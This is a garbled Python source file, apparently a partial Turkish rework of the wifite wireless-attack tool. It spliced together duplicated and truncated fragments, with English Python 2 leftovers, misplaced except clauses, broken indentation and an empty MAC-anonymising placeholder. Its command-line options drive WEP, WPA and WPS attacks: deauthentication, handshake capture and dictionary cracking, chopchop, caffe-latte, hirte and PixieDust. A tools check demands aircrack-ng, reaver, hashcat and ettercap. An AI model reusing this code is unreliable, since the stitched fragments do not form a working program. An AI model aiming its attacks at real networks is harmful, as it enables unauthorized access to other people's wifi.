        """
        option_parser = argparse.ArgumentParser()

        # set commands
        command_group = option_parser.add_argument_group('COMMAND')
        command_group.add_argument('--check', help='Check capfile [file] for handshakes.', action='store', dest='check')
        command_group.add_argument('-check', action='store', dest='check', help=argparse.SUPPRESS)
        command_group.add_argument('--cracked', help='Display previously cracked access points.', action='store_true',
                                   dest='cracked')
        command_group.add_argument('-cracked', help=argparse.SUPPRESS, action='store_true', dest='cracked')
        command_group.add_argument('--recrack', help='Include already cracked networks in targets.',
                                   action='store_true', dest='recrack')
        command_group.add_argument('-recrack', help=argparse.SUPPRESS, action='store_true', dest='recrack')

        except IndexError:

print '\nindexerror\n\n'

if capfile != '':
            self.RUN_ENGINE.analyze_capfile(capfile)
        print ''

    def build_opt_parser(self):
        """ Options are doubled for backwards compatability; will be removed soon and
            fully moved to GNU-style
        """
      class NetworkTool:
    def __init__(self):
        self.option_parser = self.build_opt_parser()
    
    def build_opt_parser(self):
        """
        Komut satırı argümanları için kapsamlı bir seçenekler analizi oluşturur.
        """
        parser = argparse.ArgumentParser(
            description="Ağ güvenlik aracı: WEP, WPA ve WPS saldırı ve doğrulama araçları.",
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )

        # Komutlar için grup
        command_group = parser.add_argument_group('Komutlar')
        command_group.add_argument('--check', help='CAP dosyasını kontrol et [dosya].', dest='check')
        command_group.add_argument('--cracked', help='Daha önce kırılmış erişim noktalarını gösterir.', action='store_true', dest='cracked')
        command_group.add_argument('--recrack', help='Zaten kırılmış ağları hedeflere dahil eder.', action='store_true', dest='recrack')
        command_group.add_argument('--update', help='Veritabanını günceller.', action='store_true', dest='update')
        command_group.add_argument('--list', help='Tüm mevcut hedefleri listeler.', action='store_true', dest='list_targets')
        command_group.add_argument('--export', help='Mevcut hedefleri belirtilen dosyaya aktarır.', dest='export')
        command_group.add_argument('--import', help='Hedefleri belirtilen dosyadan içe aktarır.', dest='import')
        command_group.add_argument('--delete', help='Belirtilen hedefi veritabanından siler.', dest='delete')

        # Global ayarlar
        global_group = parser.add_argument_group('Genel Ayarlar')
        global_group.add_argument('--all', help='Tüm hedeflere saldırır.', action='store_true', dest='all')
        global_group.add_argument('--interface', '-i', help='Veri yakalama için kablosuz arayüz. Örneğin: wlan0', dest='interface', required=True)
        global_group.add_argument('--mac', help='MAC adresini anonimleştirir.', action='store_true', dest='mac_anon')
        global_group.add_argument('--mon-iface', help='Zaten izleme modunda olan arayüz. Örneğin: wlan0mon', dest='monitor_interface')
        global_group.add_argument('--channel', '-c', help='Tarama için kanal numarası. Örneğin: 6', dest='channel')
        global_group.add_argument('--essid', '-e', help='Belirli bir erişim noktasını SSID ile hedefler. Örneğin: HomeNetwork', dest='essid')
        global_group.add_argument('--bssid', '-b', help='Belirli bir erişim noktasını BSSID ile hedefler. Örneğin: 00:14:22:01:23:45', dest='bssid')
        global_group.add_argument('--showb', help='Taramadan sonra hedef BSSID’leri gösterir.', action='store_true', dest='showb')
        global_group.add_argument('--nodeauth', help='Tarama sırasında istemcileri kimlik doğrulama yapmadan bırakır.', action='store_true', dest='nodeauth')
        global_group.add_argument('--power', help='Sinyal gücü > [pow] olan hedefleri hedefler. Örneğin: -70', dest='power')
        global_group.add_argument('--tx', help='Adaptör TX güç seviyesini ayarlar. Örneğin: 20', dest='tx')
        global_group.add_argument('--quiet', help='Tarama sırasında AP listesini yazdırmaz.', action='store_true', dest='quiet')
        global_group.add_argument('--log', help='Log dosyasının yolu. Örneğin: /path/to/logfile.log', dest='logfile')
        global_group.add_argument('--timeout', help='Genel işlem zaman aşımı süresi (saniye). Örneğin: 60', dest='timeout')
        global_group.add_argument('--retry', help='İşlem başarısız olursa maksimum tekrar sayısı. Örneğin: 5', dest='retry')

        # WPA ayarları
        wpa_group = parser.add_argument_group('WPA Ayarları')
        wpa_group.add_argument('--wpa', help='Sadece WPA ağlarını hedefler.', action='store_true', dest='wpa')
        wpa_group.add_argument('--wpat', help='WPA saldırısının tamamlanması için beklenen süre (saniye). Örneğin: 30', dest='wpat')
        wpa_group.add_argument('--wpadt', help='Deauth paketleri gönderme arasında bekleme süresi (saniye). Örneğin: 0.5', dest='wpadt')
        wpa_group.add_argument('--strip', help='Handshake’i tshark veya pyrit ile ayıklar.', action='store_true', dest='strip')
        wpa_group.add_argument('--crack', help='WPA handshake’lerini [dic] kelime listesi ile kırar.', action='store_true', dest='crack')
        wpa_group.add_argument('--dict', help='WPA kırma için kullanılacak sözlük dosyası. Örneğin: /path/to/dictionary.txt', dest='dic')
        wpa_group.add_argument('--aircrack', help='Handshake’i aircrack ile doğrular.', action='store_true', dest='aircrack')
        wpa_group.add_argument('--pyrit', help='Handshake’i pyrit ile doğrular.', action='store_true', dest='pyrit')
        wpa_group.add_argument('--tshark', help='Handshake’i tshark ile doğrular.', action='store_true', dest='tshark')
        wpa_group.add_argument('--cowpatty', help='Handshake’i cowpatty ile doğrular.', action='store_true', dest='cowpatty')
        wpa_group.add_argument('--wpa-save', help='WPA handshake’lerini bu dizine kaydeder. Örneğin: /path/to/handshakes/', dest='wpa_save')
        wpa_group.add_argument('--wpa-threshold', help='Handshake tespit eşiği. Örneğin: 10', dest='wpa_threshold')
        wpa_group.add_argument('--wpa-retry', help='WPA kırma sırasında maksimum tekrar sayısı. Örneğin: 10', dest='wpa_retry')
        wpa_group.add_argument('--wpa-timeout', help='WPA saldırısının zaman aşımı süresi (saniye). Örneğin: 180', dest='wpa_timeout')
        wpa_group.add_argument('--wpa-power', help='WPA saldırısı sırasında sinyal gücü eşiği. Örneğin: -65', dest='wpa_power')

        # WEP ayarları
        wep_group = parser.add_argument_group('WEP Ayarları')
        wep_group.add_argument('--wep', help='Sadece WEP ağlarını hedefler.', action='store_true', dest='wep')
        wep_group.add_argument('--pps', help='Her saniyede gönderilecek paket sayısını ayarlar. Örneğin: 1000', dest='pps')
        wep_group.add_argument('--wept', help='Her saldırı için bekleme süresi (0: sonsuz). Örneğin: 60', dest='wept')
        wep_group.add_argument('--chopchop', help='Chopchop saldırısını kullanır.', action='store_true', dest='chopchop')
        wep_group.add_argument('--arpreplay', help='Arpreplay saldırısını kullanır.', action='store_true', dest='arpreplay')
        wep_group.add_argument('--fragment', help='Fragmentasyon saldırısını kullanır.', action='store_true', dest='fragment')
        wep_group.add_argument('--caffelatte', help='Caffe-latte saldırısını kullanır.', action='store_true', dest='caffeelatte')
        wep_group.add_argument('--p0841', help='P0841 saldırısını kullanır.', action='store_true', dest='p0841')
        wep_group.add_argument('--hirte', help='Hirte saldırısını kullanır.', action='store_true', dest='hirte')
        wep_group.add_argument('--nofakeauth', help='Sahte kimlik doğrulama hatası durumunda saldırıyı durdurur.', action='store_true', dest='fakeauth')
        wep_group.add_argument('--wepca', help='IV sayısı [n]’i geçtikten sonra kırmaya başlar.', dest='wepca')
        wep_group.add_argument('--wepsave', help='.cap dosyalarını bu dizine kaydeder.', dest='wepsave')
        wep_group.add_argument('--wep-timeout', help='WEP saldırısı için zaman aşımı süresi (saniye). Örneğin: 120', dest='wep_timeout')
        wep_group.add_argument('--wep-retry', help='WEP saldırısı sırasında maksimum tekrar sayısı. Örneğin: 15', dest='wep_retry')
        wep_group.add_argument('--wep-power', help='WEP saldırısı sırasında sinyal gücü eşiği. Örneğin: -70', dest='wep_power')
        wep_group.add_argument('--wep-attack', help='WEP saldırı türünü seçer: [chopchop, arpreplay, fragment, caffeelatte, p0841, hirte].', dest='wep_attack')

        # WPS ayarları
        wps_group = parser.add_argument_group('WPS Ayarları')
        wps_group.add_argument('--wps', help='Sadece WPS ağlarını hedefler.', action='store_true', dest='wps')
        wps_group.add_argument('--pixie', help='Sadece WPS PixieDust saldırısını kullanır.', action='store_true', dest='pixie')
        wps_group.add_argument('--wpst', help='Yeni yeniden deneme için beklenen maksimum süre (0: asla). Örneğin: 60', dest='wpst')
        wps_group.add_argument('--wpsratio', help='Başarı oranı eşik değeri (%). Örneğin: 0.5', dest='wpsratio')
        wps_group.add_argument('--wpsretry', help='Aynı PIN için maksimum yeniden deneme sayısı. Örneğin: 10', dest='wpsretry')
        wps_group.add_argument('--wps-save', help='WPS PIN dosyalarını bu dizine kaydeder. Örneğin: /path/to/pins/', dest='wps_save')
        wps_group.add_argument('--wps-threshold', help='WPS PIN başarı eşiği. Örneğin: 0.75', dest='wps_threshold')
        wps_group.add_argument('--wps-power', help='WPS saldırısı sırasında sinyal gücü eşiği. Örneğin: -60', dest='wps_power')

        return parser

    def parse_args(self):
        """
        Komut satırı argümanlarını analiz eder ve döndürür.
        """
        return self.option_parser.parse_args()

        return parser

    def parse_args(self):
        """
        Komut satırı argümanlarını analiz eder ve döndürür.
        """
        return self.option_parser.parse_args()

        return option_parser


class RunEngine:
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config
        self.RUN_CONFIG.RUN_ENGINE = self

    def initial_check(self):
   # Programın sistemde kurulu olup olmadığını kontrol eden yardımcı işlev
def program_exists(program_name):
    """
    Belirtilen programın sistemde kurulu olup olmadığını kontrol eder.
    
    Args:
        program_name (str): Kontrol edilecek program adı.
    
    Returns:
        bool: Program kurulu ise True, değilse False.
    """
    try:
        subprocess.run([program_name, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

class NetworkTool:
    def __init__(self):
        # Kısıtlamaları kontrol et
        self.check_required_programs()

    def check_required_programs(self):
        """
        Gerekli programların sistemde kurulu olduğunu doğrular.
        """
        # Program listesi
        required_programs = [
            'aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng',
            'iw', 'iwconfig', 'ifconfig', 'reaver', 'wpscrack', 'pyrit', 'tshark',
            'cowpatty', 'hashcat', 'john', 'airmon-ng', 'netdiscover', 'crunch', 'ettercap','OznDefense-Network-System'
        ]

        # Programların kurulu olup olmadığını kontrol et
        for program in required_programs:
            if program_exists(program):
                continue
            print(R + ' [!]' + O + ' ' + R + 'OznDefense-Network-System' + O + ' programı, gelişmiş ağ savunma özellikleri için gereklidir.' + W)
            print(R + '    ' + O + '   Programı buradan temin edebilirsiniz: ' + C + 'https://github.com/ibrahimsql/OznDefense-Network-System' + W)
            print(f"\033[91m[!]\033[93m Gerekli program bulunamadı: \033[91m{program}\033[0m")
            if program in ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']:
                print("\033[91m[!]\033[93m Bu program, aircrack-ng paketiyle birlikte gelir:\033[0m")
                print("\033[91m[!]\033[93m        \033[96mhttp://www.aircrack-ng.org/\033[0m")
                print("\033[91m[!]\033[93m veya: \033[0m\033[96msudo apt-get install aircrack-ng\033[0m\n")
            elif program in ['iw', 'iwconfig', 'ifconfig']:
                print("\033[91m[!]\033[93m Bu program, ağ yönetimi araçları paketiyle gelir. Yüklemek için:\033[0m")
                print("\033[91m[!]\033[93m        \033[96msudo apt-get install wireless-tools\033[0m\n")
            elif program == 'reaver':
                print("\033[91m[!]\033[93m WPS saldırıları için \033[91mreaver\033[93m programı gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96mhttp://code.google.com/p/reaver-wps\033[0m")
            elif program == 'wpscrack':
                print("\033[91m[!]\033[93m WPS PIN'lerini kırmak için \033[91mwpscrack\033[93m programı gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96mhttps://github.com/wpscrack/wpscrack\033[0m")
            elif program == 'pyrit':
                print("\033[91m[!]\033[93m WPA handshake doğrulama için \033[91mpyrit\033[93m programı gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96mhttps://github.com/JPaulMora/Pyrit\033[0m")
            elif program == 'tshark':
                print("\033[91m[!]\033[93m WPA handshake'lerini analiz etmek için \033[91mtshark\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96msudo apt-get install wireshark\033[0m")
            elif program == 'cowpatty':
                print("\033[91m[!]\033[93m WPA handshake doğrulama için \033[91mcowpatty\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96mhttps://github.com/vanhauser-thc/cowpatty\033[0m")
            elif program == 'hashcat':
                print("\033[91m[!]\033[93m Kapsamlı parola kırma için \033[91mhashcat\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96mhttps://hashcat.net/hashcat/\033[0m")
            elif program == 'john':
                print("\033[91m[!]\033[93m Parola kırma için \033[91mJohn the Ripper\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96mhttps://www.openwall.com/john/\033[0m")
            elif program == 'netdiscover':
                print("\033[91m[!]\033[93m Ağ tarama için \033[91mnetdiscover\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96msudo apt-get install netdiscover\033[0m")
            elif program == 'crunch':
                print("\033[91m[!]\033[93m Parola sözlükleri oluşturmak için \033[91mcrunch\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96msudo apt-get install crunch\033[0m")
            elif program == 'ettercap':
                print("\033[91m[!]\033[93m ARP saldırıları için \033[91mettercap\033[93m gereklidir.\033[0m")
                print("\033[91m    \033[93m   Elde etmek için: \033[96msudo apt-get install ettercap\033[0m")

            sys.exit(1)

        print("\033[92m[TAMAM]\033[0m Gerekli tüm programlar mevcut.")
  self.RUN_CONFIG.exit_gracefully(1)

    # Check handshake-checking apps
recs = ['pyrit', 'cowpatty']
    for rec in recs:
        if program_exists(rec):
            continue
        print(R + ' [!]' + O + ' Program %s gerekli değil ancak önerilmektedir%s' % (R + rec + O, W))
    if printed:
        print('')

def enable_monitor_mode(self, iface):
    """
    İlk olarak, MAC adresini gizlemeyi dener; MAC adresleri, izleme moduna geçtiğinde gizlenemez.
    Bir cihazı İzleme Moduna geçirmek için airmon-ng kullanır.
    Daha sonra get_iface() yöntemini kullanarak yeni arayüzün adını alır.
    Ayrıca global değişken IFACE_TO_TAKE_DOWN olarak ayarlar.
    İzleme modunda olan arayüzün adını döndürür.
    """
    if self.RUN_CONFIG.mac_anon:
        self.anonymize_mac(iface)

    # İzleme moduna geçirme işlemi
    monitor_iface = None
    try:
        # İzleme moduna geçirme
        monitor_iface = self.run_command(f'airmon-ng start {iface}')
        monitor_iface = self.get_iface()
    except Exception as e:
        print(R + ' [!]' + O + ' İzleme moduna geçerken hata oluştu: %s' % (R + str(e) + W))
        self.RUN_CONFIG.exit_gracefully(1)

    # Global değişkeni ayarla
    self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = iface
def enable_monitor_mode(self, iface):
    """
    Verilen arayüzü izleme moduna geçirir ve gerekli yapılandırmaları yapar.
    Eğer isteniyorsa MAC adresini anonimleştirir, izleme modunu başlatır,
    ve TX gücünü ayarlar. Ayrıca olası hataları yakalar ve uygun mesajları
    kullanıcıya bildirir.

    :param iface: İzleme moduna geçirilecek ağ arayüzü.
    :return: İzleme moduna geçirilmiş arayüzün adı.
    """
    # MAC adresini anonimleştir
    if self.RUN_CONFIG.mac_anon:
        print(GR + ' [+]' + W + ' MAC adresini anonimleştiriyoruz %s...' % (G + iface + W), end='')
        stdout.flush()
        self.mac_anonymize(iface)
        print('done')

    # İzleme modunu başlat
    print(GR + ' [+]' + W + ' İzleme modunu etkinleştiriyoruz %s üzerinde...' % (G + iface + W), end='')
    stdout.flush()

    try:
        # İzleme moduna geçiş komutu
        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
        print('done')
    except Exception as e:
        print(R + ' [!]' + O + ' İzleme moduna geçiş sırasında bir hata oluştu: %s' % (R + str(e) + W))
        self.RUN_CONFIG.exit_gracefully(1)

    # İzleme moduna geçirilen arayüzü güncelle
    self.RUN_CONFIG.WIRELESS_IFACE = ''  # İzleme arayüzü başlatıldığından mevcut referansı kaldır
    self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()

    # TX gücünü ayarla (varsa)
    if self.RUN_CONFIG.TX_POWER > 0:
        print(GR + ' [+]' + W + ' TX gücünü %s%s%s olarak ayarlıyoruz...' % (G, self.RUN_CONFIG.TX_POWER, W), end='')
        stdout.flush()

        try:
            call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
            call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
            print('done')
        except Exception as e:
            print(R + ' [!]' + O + ' TX gücü ayarlanırken bir hata oluştu: %s' % (R + str(e) + W))
            self.RUN_CONFIG.exit_gracefully(1)

    return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

def disable_monitor_mode(self):
    """
    İzleme modunu devre dışı bırakır ve arayüzü eski haline getirir.
    Eğer izleme moduna geçiş yapılmışsa, ilgili arayüz üzerinde
    bu mod kapatılır ve kaynaklar temizlenir.

    :return: None
    """
    # İzleme modunu devre dışı bırakılacak arayüz var mı kontrol et
    if not self.RUN_CONFIG.IFACE_TO_TAKE_DOWN:
        print(GR + ' [*]' + W + ' İzleme modunda bir arayüz bulunamadı. Hiçbir işlem yapılmadı.' + W)
        return

    # İzleme modunu devre dışı bırak
    print(GR + ' [+]' + W + ' İzleme modunu devre dışı bırakıyoruz %s üzerinde...' % (G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W), end='')
    stdout.flush()

    try:
        call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
        print('done')
    except Exception as e:
        print(R + ' [!]' + O + ' İzleme modunu devre dışı bırakırken bir hata oluştu: %s' % (R + str(e) + W))
        self.RUN_CONFIG.exit_gracefully(1)

def rtl8187_fix(self, iface):
    """
    RTL8187 cihazlarında yaygın olarak karşılaşılan "Unknown error 132" hatasını çözmeyi dener.
    Bu işlem arayüzü kapatmayı, sürücü modülünü kaldırıp yeniden yüklemeyi ve
    arayüzü tekrar açmayı içerir. Hatanın çözülüp çözülmediğini kontrol eder
    ve uygun bir sonuç döner.

    :param iface: Hatanın yaşandığı ağ arayüzü.
    :return: True eğer hata giderildiyse, False aksi halde.
    """
    print(GR + ' [+]' + W + ' RTL8187 cihazında "Unknown error 132" hatasını gidermeye çalışıyoruz %s üzerinde...' % (G + iface + W), end='')
    stdout.flush()

    try:
        # Arayüzü kapatma
        call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
        
        # Sürücü modülünü kaldırma ve yeniden yükleme
        call(['rmmod', 'rtl8187'], stdout=DN, stderr=DN)
        call(['modprobe', 'rtl8187'], stdout=DN, stderr=DN)
        
        # Arayüzü tekrar açma
        call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
        print('done')
        return True
    except Exception as e:
        print(R + ' [!]' + O + ' Hata oluştu: %s' % (R + str(e) + W))
        return False

  class WirelessManager:
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config

    def check_rtl8187_chipset(self, iface):
        """
        Verilen ağ arayüzünün RTL8187 yongasını kullanıp kullanmadığını kontrol eder ve eğer kullanıyorsa
        'Unknown Error 132' hatasını gidermeye yönelik işlemleri başlatır. Hata durumunda kullanıcıyı bilgilendirir ve çıkış yapar.

        :param iface: Kontrol edilecek ağ arayüzü (örneğin, 'wlan0').
        :return: Eğer RTL8187 yongası tespit edilirse ve işlem başarılı olursa True, aksi takdirde False.
        """
        print(O + " [*]" + W + " Kontrol ediyorum, arayüz " + G + iface + W + " RTL8187 yongasını kullanıyor mu...", end='')
        stdout.flush()

        try:
            # airmon-ng komutunu çalıştır ve çıktıyı al
            proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=PIPE)
            stdout_data, stderr_data = proc_airmon.communicate()
            proc_airmon.wait()

            if proc_airmon.returncode != 0:
                # Komut çalıştırılırken hata oluşursa
                print(R + ' [!] ' + O + ' airmon-ng komutunu çalıştırırken bir hata oluştu: ' + stderr_data.decode() + W)
                self.RUN_CONFIG.exit_gracefully(1)

            # RTL8187 yongasını kullanıp kullanmadığını kontrol et
            using_rtl8187 = False
            for line in stdout_data.decode().splitlines():
                line = line.upper()
                if line.strip() == '' or line.startswith('INTERFACE'):
                    continue
                if iface.upper() in line and 'RTL8187' in line:
                    using_rtl8187 = True
                    break

            if not using_rtl8187:
                print(R + ' [!]' + O + ' RTL8187 yongası kullanılmıyor veya arayüz tespit edilemedi.' + W)
                print(R + ' [!]' + O + ' WiFi cihazınızı kesip tekrar bağlamayı deneyin.' + W)
                self.RUN_CONFIG.exit_gracefully(1)

            print(G + 'done' + W)
            print(O + " [*]" + W + " 'RTL8187 Unknown Error 132' hatasını gidermeye çalışıyoruz...", end='')
            stdout.flush()

            original_iface = iface
            # İzleme modundan çıkarmak için airmon-ng'yi kullan
            airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=PIPE)
            stdout_data, stderr_data = airmon.communicate()
            airmon.wait()

            if airmon.returncode != 0:
                # Komut çalıştırılırken hata oluşursa
                print(R + ' [!] ' + O + ' airmon-ng komutunu çalıştırırken bir hata oluştu: ' + stderr_data.decode() + W)
                self.RUN_CONFIG.exit_gracefully(1)

            # İzleme modundan çıkarılan arayüzün adını güncelle
            for line in stdout_data.decode().splitlines():
                if line.strip() == '' or line.startswith("Interface") or '(removed)' in line:
                    continue
                original_iface = line.split()[0]
            
            # RTL8187 modülünü kaldır ve yeniden yükle
            self.print_and_exec(['ifconfig', original_iface, 'down'])
            self.print_and_exec(['rmmod', 'rtl8187'])
            self.print_and_exec(['rfkill', 'block', 'all'])
            self.print_and_exec(['rfkill', 'unblock', 'all'])
            self.print_and_exec(['modprobe', 'rtl8187'])
            self.print_and_exec(['ifconfig', original_iface, 'up'])
            self.print_and_exec(['airmon-ng', 'start', original_iface])

            print('\r                                                        \r', end='')
            print(O + ' [*]' + W + ' Tarama işlemini yeniden başlatıyoruz...' + W)

            return True

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata oluştu: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def get_iface(self):
        """
        İzleme modunda olan kablosuz arayüzü bulur. Eğer mevcutsa, yalnızca izleme modunda olan cihazı döndürür.
        Aksi takdirde, mevcut WiFi cihazlarının listesini alır ve kullanıcıdan birini izleme moduna almak için seçim yapmasını ister.
        Eğer birden fazla izleme modunda arayüz varsa, kullanıcıya seçim yaptırır ve geçerli bir seçim yapıldığından emin olur.

        :return: İzleme modunda olan ağ arayüzünün adı (string).
        """
        if not self.RUN_CONFIG.PRINTED_SCANNING:
            print(GR + ' [+]' + W + ' Kablosuz cihazları tarıyorum...')
            self.RUN_CONFIG.PRINTED_SCANNING = True

        try:
            # iwconfig komutunu çalıştır ve çıktıyı al
            proc = Popen(['iwconfig'], stdout=PIPE, stderr=PIPE)
            stdout_data, stderr_data = proc.communicate()
            proc.wait()

            if proc.returncode != 0:
                # Komut çalıştırılırken hata oluşursa
                print(R + ' [!] ' + O + ' iwconfig komutunu çalıştırırken bir hata oluştu: ' + stderr_data.decode() + W)
                self.RUN_CONFIG.exit_gracefully(1)

            iface = ''
            monitors = []
            adapters = []

            # Çıktıyı analiz et ve izleme modunda olan arayüzleri bul
            for line in stdout_data.decode().splitlines():
                if len(line) == 0:
                    continue
                if not line.startswith(' '):  # Arayüzün adı satırın başında boşluk olmayan kısımdır
                    iface = line.split()[0]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                else:
                    adapters.append(iface)

            if self.RUN_CONFIG.WIRELESS_IFACE:
                if self.RUN_CONFIG.WIRELESS_IFACE in monitors:
                    return self.RUN_CONFIG.WIRELESS_IFACE
                elif self.RUN_CONFIG.WIRELESS_IFACE in adapters:
                    # Geçerli adaptör, izleme moduna al
                    print(R + ' [!]' + O + ' İzleme modunda bulunamadı: %s' % (R + '"' + self.RUN_CONFIG.WIRELESS_IFACE + '"' + O))
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                else:
                    # İstenilen adaptör bulunamadı
                    print(R + ' [!]' + O + ' Kablosuz arayüz bulunamadı: %s' % (R + '"' + self.RUN_CONFIG.WIRELESS_IFACE + '"' + O))
                    self.RUN_CONFIG.exit_gracefully(1)

            # İzleme modunda bir arayüz bulamazsak kullanıcıya bilgi ver
            if len(monitors) == 0:
                print(R + ' [!]' + O + ' İzleme modunda herhangi bir arayüz bulunamadı.' + W)
                print(R + ' [!]' + O + ' Uygun bir arayüz seçmek için tarama yapabilirsiniz.' + W)
                self.RUN_CONFIG.exit_gracefully(1)

            # Eğer tek bir izleme modundaki arayüz varsa onu döndür
            if len(monitors) == 1:
                return monitors[0]

            # Birden fazla izleme modunda arayüz varsa, kullanıcıya seçim yaptır
            print(GR + ' [+]' + W + ' Bulunan izleme modundaki arayüzler:')
            for i, monitor in enumerate(monitors, start=1):
                print(GR + ' [%d] %s' % (i, monitor))

            # Kullanıcıdan seçim yapmasını iste
            while True:
                print(GR + ' [+]' + W + ' Bir arayüz seçin (1-%d):' % len(monitors), end='')
                choice = input()
                try:
                    choice = int(choice)
                    if 1 <= choice <= len(monitors):
                        return monitors[choice - 1]
                    else:
                        print(R + ' [!]' + O + ' Geçersiz seçim. Lütfen geçerli bir numara girin.' + W)
                except ValueError:
                    print(R + ' [!]' + O + ' Geçersiz seçim. Lütfen bir sayı girin.' + W)

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata oluştu: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def enable_monitor_mode(self, iface):
        """
        Verilen ağ arayüzünü izleme moduna alır. Eğer izleme modunda ise, işlemi atlar. TX güç ayarını yapmak için
        gerekli işlemleri yapar ve arayüzün izleme moduna geçmesini sağlar.

        :param iface: İzleme moduna alınacak ağ arayüzü.
        :return: İzleme modunda olan arayüzün adı (string).
        """
        try:
            # MAC adresini gizleme isteği varsa uygula
            self.mac_anonymize(iface)

            print(GR + ' [+]' + W + ' İzleme modunu etkinleştiriyorum ' + G + iface + W + ' üzerinde...', end='')
            stdout.flush()

            # airmon-ng kullanarak arayüzü izleme moduna al
            call(['airmon-ng', 'start', iface], stdout=PIPE, stderr=PIPE)

            print(G + 'done' + W)
            self.RUN_CONFIG.WIRELESS_IFACE = ''  # İzleme modundaki karşılığını başlattığımız için bu referansı kaldır
            self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()  # Yeni arayüz adını al

            if self.RUN_CONFIG.TX_POWER > 0:
                print(GR + ' [+]' + W + ' TX gücünü ayarlıyorum: %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W), end='')
                call(['iw', 'reg', 'set', 'BO'], stdout=PIPE, stderr=PIPE)
                call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=PIPE, stderr=PIPE)
                print(G + 'done' + W)

            return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata oluştu: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def disable_monitor_mode(self):
        """
        İzleme modunda olan ağ arayüzünü devre dışı bırakır. Eğer bu modda bir arayüz varsa, durdurur ve arayüzün eski haline dönmesini sağlar.
        """
        if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '':
            return

        try:
            print(GR + ' [+]' + W + ' İzleme modunu devre dışı bırakıyorum ' + G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W + ' üzerinde...', end='')
            stdout.flush()

            call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=PIPE, stderr=PIPE)
            print(G + 'done' + W)

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata oluştu: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def print_and_exec(self, cmd_list):
        """
        Verilen komutu çalıştırır ve sonucunu kullanıcıya bildirir. Komut çalıştırılırken bir hata oluşursa, hata mesajını gösterir.

        :param cmd_list: Çalıştırılacak komutun argümanlarının listesi.
        """
        try:
            print(GR + ' [+]' + W + ' Komut çalıştırılıyor: ' + ' '.join(cmd_list) + '...', end='')
            stdout.flush()

            proc = Popen(cmd_list, stdout=PIPE, stderr=PIPE)
            stdout_data, stderr_data = proc.communicate()
            proc.wait()

            if proc.returncode == 0:
                print(G + 'done' + W)
            else:
                print(R + ' [!] ' + O + ' Komut çalıştırılırken hata oluştu: ' + stderr_data.decode() + W)

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata oluştu: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def mac_anonymize(self, iface):
        """
        Eğer kullanıcı MAC adresini gizlemek istiyorsa, MAC adresini anonimleştirmek için gerekli işlemleri yapar.
        (Bu fonksiyonun içeriği eksik olduğu için bu sadece bir yer tutucudur ve uygulamanızın gereksinimlerine göre genişletilmelidir.)

        :param iface: MAC adresi gizlenecek ağ arayüzü.
        """
        # MAC adresini gizlemek için yapılacak işlemleri buraya ekleyin
        pass

# Örnek kullanım
# run_config = RunConfig()
# manager = WirelessManager(run_config)
# iface = manager.get_iface()
# if iface:
#     manager.check_rtl8187_chipset(iface)
#     manager.enable_monitor_mode(iface)
#     # ... diğer işlemler ...
#     ma# Renkli çıktılar için renk kodları
R = '\033[91m'  # Kırmızı
G = '\033[92m'  # Yeşil
O = '\033[93m'  # Turuncu
W = '\033[0m'   # Beyaz

class WirelessManager:
    def __init__(self, run_config):
        """
        WirelessManager sınıfının başlatıcı fonksiyonu.
        :param run_config: Çalışma yapılandırma nesnesi.
        """
        self.RUN_CONFIG = run_config
        self.setup_logging()

    def setup_logging(self):
        """
        Loglama yapılandırmasını ayarlar. Tüm loglar 'wireless_manager.log' dosyasına yazılır.
        """
        logging.basicConfig(filename='wireless_manager.log',
                            level=logging.DEBUG,
